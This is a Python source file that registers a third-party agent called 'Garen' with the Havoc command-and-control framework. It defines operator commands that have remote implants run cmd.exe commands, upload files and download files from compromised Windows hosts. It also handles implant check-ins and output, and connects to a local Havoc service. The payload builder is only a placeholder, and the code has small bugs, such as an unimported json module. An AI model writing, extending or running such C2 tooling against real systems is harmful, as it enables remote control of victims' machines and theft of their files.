from base64 import b64decode

from havoc.service import HavocService
from havoc.agent import *

COMMAND_REGISTER         = 0x100
COMMAND_GET_JOB          = 0x101
COMMAND_NO_JOB           = 0x102
COMMAND_SHELL            = 0x152
COMMAND_UPLOAD           = 0x153
COMMAND_DOWNLOAD         = 0x154
COMMAND_EXIT             = 0x155
COMMAND_OUTPUT           = 0x200

# ====================
# ===== Commands =====
# ====================
class CommandShell(Command):
    CommandId = COMMAND_SHELL
    Name = "shell"
    Description = "executes commands using cmd.exe"
    Help = ""
    NeedAdmin = False
    Params = [
        CommandParam(
            name="commands",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_data( "c:\windows\system32\cmd.exe /c " + arguments[ 'commands' ] )

        return Task.buffer

class CommandUpload( Command ):
    CommandId   = COMMAND_UPLOAD
    Name        = "upload"
    Description = "uploads a file to the host"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="local_file",
            is_file_path=True,
            is_optional=False
        ),

        CommandParam(
            name="remote_file",
            is_file_path=False,
            is_optional=False
        )
    ]

    def job_generate( self, arguments: dict ) -> bytes:
        
        Task        = Packer()
        remote_file = arguments[ 'remote_file' ]
        fileData    = b64decode( arguments[ 'local_file' ] )

        Task.add_int( self.CommandId )
        Task.add_data( remote_file )
        Task.add_data( fileData )

        return Task.buffer

class CommandDownload( Command ):
    CommandId   = COMMAND_DOWNLOAD
    Name        = "download"
    Description = "downloads the requested file"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="remote_file",
            is_file_path=False,
            is_optional=False
        ),
    ]

    def job_generate( self, arguments: dict ) -> bytes:
        
        Task        = Packer()
        remote_file = arguments[ 'remote_file' ]

        Task.add_int( self.CommandId )
        Task.add_data( remote_file )

        return Task.buffer

class CommandExit( Command ):
    CommandId   = COMMAND_EXIT
    Name        = "exit"
    Description = "tells the talon agent to exit"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:

        Task = Packer()

        Task.add_int( self.CommandId )

        return Task.buffer

# =======================
# ===== Agent Class =====
# =======================
class Garen(AgentType):
    Name = "Garen"
    Author = "@lapinousexy"
    Version = "0.1"
    Description = f"""Garen 3rd party agent for Havoc"""
    MagicValue = 0x42424242 # 'garen'

    Arch = [
        "x64"
    ]

    Formats = [
        {
            "Name": "Windows Executable",
            "Extension": "exe",
        },
    ]

    BuildingConfig = {
        "Sleep": "10"
    }

    Commands = [
        CommandShell(),
        CommandUpload(),
        CommandDownload(),
        CommandExit(),
    ]

    # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function. 
    def generate( self, config: dict ) -> None:

        print( f"config: {config}" )

        # builder_send_message. this function send logs/messages to the payload build for verbose information or sending errors (if something went wrong). 
        self.builder_send_message( config[ 'ClientID' ], "Info", f"hello from service builder" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )

        # build_send_payload. this function send back your generated payload 
        self.builder_send_payload( config[ 'ClientID' ], self.Name + ".bin", "test bytes".encode('utf-8') ) # this is just an example. 

    # this function handles incomming requests based on our magic value. you can respond to the agent by returning your data from this function. 
    def response( self, response: dict ) -> bytes:

        agent_header    = response[ "AgentHeader" ]
        agent_response  = b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request. 
        response_parser = Parser( agent_response, len(agent_response) )
        Command         = response_parser.parse_int()

        print(agent_response)

        agentjson = json.loads(agent_response)

        if agentjson["task"] == "register":
            print("[*] Registered agent")
            self.register( agent_header, agentjson["data"])

            return b'registered'
        elif agentjson["task"] == "gettask":
            AgentID = response[ "Agent" ][ "NameID" ]

            print("[*] Agent requested taskings")
            Tasks = self.get_task_queue( response[ "Agent" ] )
            print("Tasks retrieved")

            print(Tasks)

            return Tasks
        elif agentjson["task"] == "cmdoutput":
            AgentID = response[ "Agent" ][ "NameID" ]
            
            print("[*] Agent requested taskings")
            Tasks = self.get_task_queue( response[ "Agent" ] )
            print("Tasks retrieved")

            if len(agentjson["data"]) > 0:
                print("Output: " + agentjson["data"])
                self.console_message( AgentID, "Good", "Received Output:", agentjson["data"] )
            
        elif agentjson["task"] == "download":
            AgentID = response[ "Agent" ][ "NameID" ]
            
            print("[*] Agent requested taskings")
            Tasks = self.get_task_queue( response[ "Agent" ] )
            print("Tasks retrieved")

            downloadJson = agentjson["data"]

            fileName = downloadJson["FileName"]
            fileSize = downloadJson["FileSize"]
            fileContent = downloadJson["FileContent"]
            self.download_file( AgentID, fileName, fileSize, fileContent)
        
        elif agentjson["task"] == "upload":
            AgentID = response[ "Agent" ][ "NameID" ]
            
            print("[*] Agent requested taskings")
            Tasks = self.get_task_queue( response[ "Agent" ] )
            print("Tasks retrieved")

            if len(agentjson["data"]) > 0:
                print("Output: " + agentjson["data"])
                self.console_message( AgentID, "Good", "Received Output:", agentjson["data"] )

        return b''

def main():
    Havoc_Garen = Garen()

    print( "[*] Connect to Havoc service api" )
    Havoc_Service = HavocService(
        endpoint="ws://127.0.0.1:40056/service-endpoint",
        password="service-password"
    )
     
    print( "[*] Register Garen to Havoc" )
    Havoc_Service.register_agent(Havoc_Garen)

    return

if __name__ == '__main__':
    main()
